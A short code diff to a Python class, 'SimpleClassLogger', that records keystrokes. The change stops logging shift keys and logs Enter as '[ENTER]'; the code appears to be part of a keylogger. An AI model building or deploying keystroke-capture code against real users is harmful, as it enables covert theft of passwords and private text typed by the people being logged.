@@ -21,10 +21,8 @@ class SimpleClassLogger:
         except AttributeError:
             if key == Key.backspace:
                 self.append_to_log("[BACKSPACE]")
-            elif key in (Key.shift, Key.shift_r):
-                self.append_to_log("[SHIFT]")
             elif key == Key.enter:
-                self.append_to_log("\n")  
+                self.append_to_log("[ENTER]") #includes ENTER key
             else:             
                 pass
 
